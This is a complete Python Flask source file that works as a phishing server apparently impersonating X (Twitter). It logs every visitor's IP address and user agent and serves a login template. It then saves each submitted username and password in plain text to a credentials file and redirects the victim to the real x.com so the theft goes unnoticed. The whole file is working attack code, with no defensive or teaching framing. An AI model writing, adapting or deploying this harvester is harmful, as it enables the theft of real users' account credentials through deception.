from flask import Flask, request, render_template, redirect
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def login():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    with open('logs/visitors.log', 'a') as log:
        log.write(f"[X] {datetime.now()} | IP: {ip} | UA: {ua}\n")
    return render_template('login_x.html')

@app.route('/login', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    with open('logs/credentials.txt', 'a') as cred:
        cred.write(f"[X] {datetime.now()} | IP: {ip} | {username}:{password}\n")
    return redirect('https://x.com/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5005)
